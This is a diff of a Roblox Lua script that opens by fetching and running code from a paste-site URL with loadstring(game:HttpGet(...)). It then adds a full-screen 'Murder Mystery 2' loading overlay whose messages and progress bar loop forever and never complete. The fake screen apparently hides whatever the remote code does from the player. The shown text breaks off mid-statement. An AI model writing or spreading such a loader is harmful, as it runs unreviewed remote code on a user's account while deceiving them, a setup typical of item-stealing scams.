@@ -1,1 +1,116 @@
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/ncftONtFUi/0"))()
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- ScreenGui
+local gui = Instance.new("ScreenGui")
+gui.Name = "MM2Loading"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = playerGui
+
+-- Background
+local bg = Instance.new("Frame")
+bg.Size = UDim2.fromScale(1, 1)
+bg.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
+bg.BorderSizePixel = 0
+bg.Parent = gui
+
+-- Title
+local title = Instance.new("TextLabel")
+title.AnchorPoint = Vector2.new(0.5, 0.5)
+title.Position = UDim2.fromScale(0.5, 0.38)
+title.Size = UDim2.fromScale(0.8, 0.1)
+title.BackgroundTransparency = 1
+title.Text = "MURDER MYSTERY 2"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = bg
+
+-- Loading text
+local loading = Instance.new("TextLabel")
+loading.AnchorPoint = Vector2.new(0.5, 0.5)
+loading.Position = UDim2.fromScale(0.5, 0.50)
+loading.Size = UDim2.fromScale(0.8, 0.06)
+loading.BackgroundTransparency = 1
+loading.TextColor3 = Color3.fromRGB(190, 190, 190)
+loading.TextScaled = true
+loading.Font = Enum.Font.Gotham
+loading.Parent = bg
+
+-- Status
+local status = Instance.new("TextLabel")
+status.AnchorPoint = Vector2.new(0.5, 0.5)
+status.Position = UDim2.fromScale(0.5, 0.56)
+status.Size = UDim2.fromScale(0.8, 0.05)
+status.BackgroundTransparency = 1
+status.TextColor3 = Color3.fromRGB(120, 120, 120)
+status.TextScaled = true
+status.Font = Enum.Font.Gotham
+status.Parent = bg
+
+-- Progress bar background
+local barBG = Instance.new("Frame")
+barBG.AnchorPoint = Vector2.new(0.5, 0.5)
+barBG.Position = UDim2.fromScale(0.5, 0.65)
+barBG.Size = UDim2.fromScale(0.55, 0.018)
+barBG.BackgroundColor3 = Color3.fromRGB(35, 35, 42)
+barBG.BorderSizePixel = 0
+barBG.Parent = bg
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(1, 0)
+corner.Parent = barBG
+
+local bar = Instance.new("Frame")
+bar.Size = UDim2.fromScale(0.15, 1)
+bar.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
+bar.BorderSizePixel = 0
+bar.Parent = barBG
+
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(1, 0)
+barCorner.Parent = bar
+
+-- Infinite loading animation
+task.spawn(function()
+	local messages = {
+		"Loading GUI",
+		"Loading scripts",
+		"Loading assets",
+		"Loading modules",
+		"Initializing interface",
+		"Preparing Murder Mystery 2",
+		"Waiting for resources",
+		"Almost ready"
+	}
+
+	local index = 1
+
+	while true do
+		-- Text animation
+		for dots = 0, 3 do
+			loading.Text = messages[index] .. string.rep(".", dots)
+			task.wait(0.35)
+		end
+
+		index += 1
+		if index > #messages then
+			index = 1
+		end
+	end
+end)
+
+-- Infinite moving progress bar
+task.spawn(function()
+	while true do
+		bar.Position = UDim2.fromScale(-0.15, 0)
+
+		local tween = TweenService:Create(
+			bar,
+			TweenInfo.new(1.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
+			{Position = UDim2.fromScale(1, 
